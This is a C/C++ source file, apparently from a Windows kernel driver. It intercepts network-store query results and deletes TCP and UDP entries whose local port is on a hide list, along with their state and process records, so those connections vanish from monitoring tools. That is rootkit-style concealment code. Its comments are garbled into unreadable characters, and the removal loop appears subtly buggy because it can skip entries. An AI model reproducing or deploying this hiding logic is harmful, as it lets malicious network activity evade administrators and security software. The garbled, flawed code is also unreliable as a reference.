#include "Hide.h"
#include "Rules.h"

bool g_IsHide;//���ص��ܿ��ء�


//////////////////////////////////////////////////////////////////////////////////////////////////


bool IsHideUdp(_In_ PUdpTable Entry)
/*
���ܣ�ʶ���ǲ���Ҫ���ص���Ϣ��

���ڻ����Կ��ǼӲ������磺���̵ȡ�
*/
{
    bool ret = false;

    if (IsHideLocalPort(RtlUshortByteSwap(Entry->LocalPort))) {
        ret = true;
    }

    return ret;
}


bool IsHideTcp(_In_ PTcpTable Entry)
/*
���ܣ�ʶ���ǲ���Ҫ���ص���Ϣ��

���ڻ����Կ��ǼӲ������磺���̵ȡ�
*/
{
    bool ret = false;

    if (IsHideLocalPort(RtlUshortByteSwap(Entry->LocalPort))) {
        ret = true;
    }

    /*
    �����Լ�����ӱ�ģ��磺IPv4/6.
    ��ϵ�Ǻ͡�
    */

    return ret;
}


void HideUdpInfo(_In_ PNsiParameters NsiParam)
/*
���ܣ�����UDP������Ϣ���磺���ض˿ڡ�

�߼�����������ĳ�����̵����е������ͨѶ��Ϣ��

������
�Ƴ�p1,p2,StateInfo,p4�����Ӧ�Ľڵ�Ԫ����Ϣ���ɡ�
���Ҫ���ˣ�����Counter��Ա��ֵ��
*/
{
    if (nullptr == NsiParam) {
        return;
    }

    if (0 == NsiParam->Counter) {
        return;
    }

    PUdpTable Table = (PUdpTable)NsiParam->p1;
    PBYTE p2 = (PBYTE)NsiParam->p2;
    PStateTable State = (PStateTable)NsiParam->StateInfo;
    PProcessTable Module = (PProcessTable)NsiParam->ProcessInfo;

    for (ULONG i = 0; i < NsiParam->Counter; i++) {
        bool IsHide = false;

        if (NsiParam->p1) {
            IsHide = IsHideUdp(Table);
            if (IsHide) {
                //�ƶ����Ԫ�غ�������ݵ����Ԫ�ص�λ�á�
                memmove(Table, Table + 1, NsiParam->size1 * (NsiParam->Counter - i));
                NsiParam->Counter--;
            }

            Table++;
        }

        if (NsiParam->p2) {
            //��������ƥ���ˣ�����ҲӦ�Ƴ��¡�
            //����Ҳ����ƥ���¡�

            if (IsHide) {
                memmove(p2, p2 + NsiParam->size2, NsiParam->size2 * (NsiParam->Counter - i));
            }

            p2 += NsiParam->size2;
        }

        if (NsiParam->StateInfo) {
            //��������ƥ���ˣ�����ҲӦ�Ƴ��¡�
            //����Ҳ����ƥ���¡�

            if (IsHide) {
                memmove(State, State + 1, NsiParam->size3 * (NsiParam->Counter - i));
            }

            State++;
        }

        if (NsiParam->ProcessInfo) {
            //��������ƥ���ˣ�����ҲӦ�Ƴ��¡�
            //����Ҳ����ƥ���¡�

            if (IsHide) {
                memmove(Module, Module + 1, NsiParam->size4 * (NsiParam->Counter - i));
            }

            Module++;
        }
    }

    //����Counter��ֵ������Ѿ����£�������ԡ�
    //NsiParam->Counter = XXX��
}


void HideTcpInfo(_In_ PNsiParameters NsiParam)
/*
���ܣ�����Tcp������Ϣ���磺���ض˿ڣ�Զ��IP(v4/6)��

�߼�����������ĳ�����̵����е������ͨѶ��Ϣ��

������
�Ƴ�p1,p2,StateInfo,p4�����Ӧ�Ľڵ�Ԫ����Ϣ���ɡ�
���Ҫ���ˣ�����Counter��Ա��ֵ��

���Կ��ǣ���HideTcpInfo��HideUdpInfo�ϲ�Ϊģ�塣
*/
{
    if (nullptr == NsiParam) {
        return;
    }

    if (0 == NsiParam->Counter) {
        return;
    }

    PTcpTable Table = (PTcpTable)NsiParam->p1;
    PBYTE p2 = (PBYTE)NsiParam->p2;
    PStateTable State = (PStateTable)NsiParam->StateInfo;
    PProcessTable Module = (PProcessTable)NsiParam->ProcessInfo;

    for (ULONG i = 0; i < NsiParam->Counter; i++) {
        bool IsHide = false;

        if (NsiParam->p1) {
            IsHide = IsHideTcp(Table);
            if (IsHide) {
                //�ƶ����Ԫ�غ�������ݵ����Ԫ�ص�λ�á�
                memmove(Table, Table + 1, NsiParam->size1 * (NsiParam->Counter - i));
                NsiParam->Counter--;
            }

            Table++;
        }

        if (NsiParam->p2) {
            //��������ƥ���ˣ�����ҲӦ�Ƴ��¡�
            //����Ҳ����ƥ���¡�

            if (IsHide) {
                memmove(p2, p2 + NsiParam->size2, NsiParam->size2 * (NsiParam->Counter - i));
            }

            p2 += NsiParam->size2;
        }

        if (NsiParam->StateInfo) {
            //��������ƥ���ˣ�����ҲӦ�Ƴ��¡�
            //����Ҳ����ƥ���¡�

            if (IsHide) {
                memmove(State, State + 1, NsiParam->size3 * (NsiParam->Counter - i));
            }

            State++;
        }

        if (NsiParam->ProcessInfo) {
            //��������ƥ���ˣ�����ҲӦ�Ƴ��¡�
            //����Ҳ����ƥ���¡�

            if (IsHide) {
                memmove(Module, Module + 1, NsiParam->size4 * (NsiParam->Counter - i));
            }

            Module++;
        }
    }

    //����Counter��ֵ������Ѿ����£�������ԡ�
    //NsiParam->Counter = XXX��
}
